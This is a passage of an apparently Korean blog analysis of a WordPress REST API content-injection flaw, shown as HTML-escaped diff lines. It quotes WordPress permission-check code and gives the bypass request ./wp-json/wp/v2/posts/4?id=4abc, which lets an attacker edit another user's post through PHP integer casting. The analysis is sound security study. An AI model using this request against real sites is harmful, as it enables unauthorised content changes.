-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'permission_callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'update_item_permissions_check'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'args'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get_endpoint_args_for_item_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;EDITABLE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'methods'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DELETABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'delete_item'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'permission_callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'delete_item_permissions_check'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'args'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'force'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                              &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'type'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'boolean'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                              &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                              &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'description'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Whether to bypass trash and force deletion.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                    &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;s1&quot;&gt;'schema'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get_public_item_schema'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;게시물에 대한 작업을 수행하는 Rest API는 JSON 방식으로 통신하며 등록된 경로에 해당하는 요청에 따라 각기 다른 함수를 콜백하게 됩니다. 게시물 수정 시 namespace는 ‘/wp/v2’ 이며, rest_base는 ‘posts’이며 등록된 경로는 ./wp-json/wp/v2/posts/id 입니다.&lt;/p&gt;
-
-&lt;p&gt;서버측에 ./wp-json/wp/v2/posts/id와 같이 요청이 오면 해당 id에 대한 수정작업을 위해 update_item_permissions_check, update_item 함수를 콜백하여 게시물 수정 작업을 수행합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_2.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-2]
-  서버 IP/index.php/wp-json/wp-v2/posts/4 요청
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;공격자는 ./wp-json/wp/v2/posts/4?id=4abc와 같이 요청을 보내면 id 매개 변수에 4abc 값으로 설정되는 것을 확인할 수 있고 이것을 이용하여 id값이 4인 게시물에 대한 내용 변경하는 공격을 시도해볼 수 있습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_3.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-3]
-  서버IP/index.php/wp-json/wp-v2/posts/4?id=4abc 요청
- &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Privilege Escalation / Content Injection 취약점은 class-wp-rest-posts-controller.php에 존재하는 update_item_permissions_check, update_item에서 권한 체크 문제와 형변환(Cascading) 버그로 발생합니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update_item_permissions_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post_type_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;post_type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_update_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to edit this post.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_current_user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit_others'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to update posts as this user.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to make posts sticky.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_assign_terms_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_term'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to assign the provided terms.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;사용자가 게시물 수정 요청을 보내면 해당 게시물에 대한 권한을 체크하기 위해 update_item_permissions_check 함수를 콜백하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;공격자가 ./wp-json/wp/v2/posts/4?id=4abc와 같이 요청을 보내는 경우 4abc에 해당하는 게시물이 없어 권한체크를 하는 if문을 벗어나 return true결과를 나타내어 권한체크 로직을 우회할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update_item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    …&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;매개변수로 전달되는 $request의 id 값을 int형으로 형변환(Cascading)을 하는 부분이 있는데, $request[‘id’]의 값 중 숫자이외에 문자, 문자열이 포함되는 경우 삭제가 됩니다. 이는 PHP의 형변환 규칙으로 인해 문자열을 정수형으로 형변환 시 문자가 나오는 지점부터 데이터가 손실이 발생하게 됩니다. 
- 
-간단하게 PHP 문자열 데이터를 정수형으로 형변환하는 코드와 그 결과를 아래의 코드와 그림으로 결과를 알아볼 수 있습니다.&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4abc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
